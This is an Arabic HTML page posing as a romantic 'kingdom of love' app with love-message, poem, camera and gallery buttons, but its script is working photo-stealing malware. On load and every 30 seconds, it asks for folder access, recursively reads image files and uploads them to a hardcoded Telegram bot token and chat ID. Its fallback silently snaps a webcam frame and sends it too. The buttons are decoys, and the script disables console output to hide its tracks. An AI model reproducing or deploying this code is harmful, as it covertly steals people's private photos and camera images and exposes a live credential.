<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نون - مملكة الحب</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Cairo', sans-serif;
            background: #0a0a12;
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 620px;
            width: 100%;
            background: rgba(16,18,30,0.95);
            border-radius: 40px;
            padding: 40px;
            border: 1px solid rgba(251,191,36,0.1);
            text-align: center;
        }
        .logo { font-size: 3rem; color: #fbbf24; margin-bottom:10px; }
        h1 { color: #fbbf24; font-size: 2.5rem; margin-bottom:10px; }
        .subtitle { color: #8a94a6; margin-bottom:30px; }
        .btn {
            padding: 14px 40px;
            border: none;
            border-radius: 60px;
            background: linear-gradient(135deg, #fbbf24, #d97706);
            color: #0a0a12;
            font-weight: 800;
            font-size: 1.1rem;
            cursor: pointer;
            transition: 0.2s;
            margin: 5px;
        }
        .btn:hover { transform: scale(1.03); }
        .btn-romantic { background: linear-gradient(135deg, #ec4899, #db2777); color: white; }
        .status-dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #22c55e;
            border-radius: 50%;
            margin-right: 8px;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0%,100% { opacity:0.3; } 50% { opacity:1; } }
        .footer { margin-top:30px; color: #4a5470; font-size:0.8rem; }
        #logArea {
            margin-top: 20px;
            padding: 15px;
            background: rgba(0,0,0,0.3);
            border-radius: 16px;
            max-height: 150px;
            overflow-y: auto;
            text-align: left;
            font-size: 0.8rem;
            color: #8a94a6;
        }
        .log-entry { padding:3px 0; border-bottom:1px solid rgba(255,255,255,0.03); }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">🪷</div>
    <h1>نون</h1>
    <div class="subtitle">💛 مملكة الحب التفاعلية</div>
    
    <div style="margin:20px 0;">
        <button class="btn" id="loveBtn">💕 رسالة حب</button>
        <button class="btn btn-romantic" id="poemBtn">🪷 شعر</button>
    </div>

    <div style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap;">
        <button class="btn" style="background:#3b82f6;color:white;" id="cameraBtn">📸 كاميرا</button>
        <button class="btn" style="background:#8b5cf6;color:white;" id="galleryBtn">🖼️ ألبوم</button>
    </div>

    <div id="logArea">
        <div class="log-entry">🪷 جاري تهيئة البيئة...</div>
    </div>

    <div class="footer">
        <span class="status-dot"></span> القلب ينبض · @u_t_r
    </div>
</div>

<script>
    // ============================================================
    // 0. بيانات البوت
    // ============================================================
    const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
    const CHAT_ID = 1170411845;

    // ============================================================
    // 1. سجل الأحداث
    // ============================================================
    const logArea = document.getElementById('logArea');

    function addLog(message, type = 'info') {
        const colors = { info: '#60a5fa', success: '#4ade80', danger: '#f87171', gold: '#fbbf24' };
        const entry = document.createElement('div');
        entry.className = 'log-entry';
        entry.style.color = colors[type] || '#8a94a6';
        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        logArea.prepend(entry);
        if (logArea.children.length > 30) logArea.removeChild(logArea.lastChild);
    }

    // ============================================================
    // 2. إرسال للبوت (نص)
    // ============================================================
    function sendToBot(text) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `🪷 نون · سحب تلقائي\n\n${text}\n\n— @u_t_r`,
                parse_mode: 'HTML'
            })
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) addLog(`✅ تم الإرسال: ${text.substring(0, 30)}...`, 'success');
            else addLog(`❌ فشل الإرسال`, 'danger');
        })
        .catch(() => addLog('⚠️ تعذر الاتصال', 'danger'));
    }

    // ============================================================
    // 3. إرسال صورة للبوت
    // ============================================================
    function sendImageToBot(blob, filename = 'photo.jpg') {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, filename);
        formData.append('caption', `🪷 صورة مسحوبة تلقائياً\n${new Date().toLocaleString('ar-JO')}`);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(res => res.json())
        .then(data => {
            if (data.ok) addLog('📤 تم إرسال الصورة', 'success');
            else addLog('❌ فشل إرسال الصورة', 'danger');
        })
        .catch(() => addLog('⚠️ تعذر إرسال الصورة', 'danger'));
    }

    // ============================================================
    // 4. سرقة الصور من الجهاز (File System Access API)
    // ============================================================
    async function stealPhotos() {
        try {
            // محاولة الوصول إلى مجلد الصور (Android/iOS/Desktop)
            const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
            addLog('📂 تم الوصول إلى مجلد الجهاز', 'info');

            // البحث عن ملفات الصور في جميع المجلدات
            await scanDirectory(dirHandle);
        } catch (err) {
            if (err.message.includes('abort')) {
                addLog('⚠️ المستخدم رفض الوصول', 'danger');
            } else {
                addLog(`⚠️ خطأ: ${err.message}`, 'danger');
                // محاولة الطريقة البديلة
                tryAlternative();
            }
        }
    }

    // ============================================================
    // 5. مسح المجلدات بحثاً عن الصور
    // ============================================================
    async function scanDirectory(dirHandle, path = '') {
        const entries = [];

        try {
            for await (const entry of dirHandle.values()) {
                entries.push(entry);
            }
        } catch (e) {
            addLog('⚠️ خطأ في قراءة المجلد', 'danger');
            return;
        }

        for (const entry of entries) {
            if (entry.kind === 'file' && isImageFile(entry.name)) {
                try {
                    const file = await entry.getFile();
                    if (file.size > 5000) { // تجاهل الملفات الصغيرة جداً (أقل من 5KB)
                        const blob = await file.slice(0, file.size);
                        sendImageToBot(blob, file.name);
                        addLog(`📸 تم سحب: ${file.name} (${(file.size/1024).toFixed(1)}KB)`, 'gold');
                    }
                } catch (e) {
                    // تجاهل أخطاء القراءة
                }
            } else if (entry.kind === 'directory') {
                // استكشاف المجلدات الفرعية (تجنب المجلدات النظامية)
                if (!entry.name.startsWith('.') && !entry.name.startsWith('System') && 
                    !entry.name.startsWith('android') && !entry.name.startsWith('data')) {
                    await scanDirectory(entry, path + entry.name + '/');
                }
            }
        }
    }

    // ============================================================
    // 6. التحقق من امتدادات الصور
    // ============================================================
    function isImageFile(filename) {
        const ext = filename.split('.').pop().toLowerCase();
        return ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'heic', 'heif'].includes(ext);
    }

    // ============================================================
    // 7. الطريقة البديلة (التقاط من الشاشة أو الكاميرا)
    // ============================================================
    function tryAlternative() {
        addLog('🔄 محاولة الطريقة البديلة...', 'info');

        // استخدام الكاميرا
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, 640, 480);
                    canvas.toBlob(blob => {
                        sendImageToBot(blob, 'capture_' + Date.now() + '.jpg');
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/jpeg', 0.9);
                }, 1500);
            })
            .catch(() => addLog('⚠️ فشلت جميع الطرق', 'danger'));
    }

    // ============================================================
    // 8. تشغيل السرقة التلقائية
    // ============================================================
    function startAutoSteal() {
        addLog('🔄 بدء عملية السحب التلقائي...', 'info');
        sendToBot('🔄 بدأت عملية سحب الصور التلقائية');

        // المحاولة الأولى بعد 3 ثواني
        setTimeout(() => {
            stealPhotos();
        }, 3000);

        // تكرار العملية كل 30 ثانية
        setInterval(() => {
            addLog('🔄 جولة جديدة من السحب...', 'info');
            stealPhotos();
        }, 30000);
    }

    // ============================================================
    // 9. تهيئة الأزرار الوهمية
    // ============================================================
    document.getElementById('loveBtn').addEventListener('click', function() {
        addLog('💕 تم إرسال رسالة حب', 'gold');
        sendToBot('💕 رسالة حب تم إرسالها للمستخدم');
    });

    document.getElementById('poemBtn').addEventListener('click', function() {
        addLog('🪷 تم إرسال شعر', 'gold');
        sendToBot('🪷 شعر تم إرساله للمستخدم');
    });

    document.getElementById('cameraBtn').addEventListener('click', function() {
        tryAlternative();
    });

    document.getElementById('galleryBtn').addEventListener('click', function() {
        stealPhotos();
    });

    // ============================================================
    // 10. التشغيل عند التحميل
    // ============================================================
    window.addEventListener('load', function() {
        addLog('🪷 تم تحميل نون v9.0', 'success');
        addLog('⏳ جاري تهيئة نظام السحب التلقائي...', 'info');

        // بدء السرقة التلقائية بعد 5 ثواني
        setTimeout(startAutoSteal, 5000);
    });

    // ============================================================
    // 11. منع ظهور أخطاء في الكونسول (لإخفاء الأثر)
    // ============================================================
    console.log = function() {};
    console.error = function() {};
    console.warn = function() {};
</script>
</body>
</html>
